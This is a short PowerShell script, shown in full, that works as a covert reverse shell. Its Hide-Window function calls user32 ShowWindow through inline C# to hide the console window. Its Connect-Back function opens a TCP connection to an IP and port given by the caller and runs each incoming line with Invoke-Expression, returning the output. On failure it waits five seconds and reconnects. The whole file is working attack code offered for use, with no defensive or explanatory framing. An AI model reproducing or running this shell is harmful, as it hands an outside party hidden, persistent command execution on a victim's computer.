param (
    [string]$ip,
    [int]$port
)

# Function to hide the PowerShell window
function Hide-Window {
    $code = @"
using System;
using System.Runtime.InteropServices;

public class Window {
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    private static extern int ShowWindow(IntPtr hWnd, uint nCmdShow);

    private const uint SW_HIDE = 0;
    private const uint SW_SHOW = 5;

    public static void Hide() {
        IntPtr hWnd = GetForegroundWindow();
        ShowWindow(hWnd, SW_HIDE);
    }

    public static void Show() {
        IntPtr hWnd = GetForegroundWindow();
        ShowWindow(hWnd, SW_SHOW);
    }
}
"@
    Add-Type -TypeDefinition $code -Language CSharp
    [Window]::Hide()
}

function Connect-Back {
    param (
        [string]$ip,
        [int]$port
    )
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)

    try {
        while ($true) {
            $data = $reader.ReadLine()
            if ($data) {
                try {
                    $output = Invoke-Expression $data 2>&1 | Out-String
                } catch {
                    $output = $_.Exception.Message
                }
                $output = $output.Trim()
                $writer.WriteLine($output)
                $writer.Flush()
            }
        }
    } catch {
        Start-Sleep -Seconds 5
        Connect-Back -ip $ip -port $port
    } finally {
        $writer.Close()
        $reader.Close()
        $client.Close()
    }
}

# Main execution
Hide-Window
Connect-Back -ip $ip -port $port
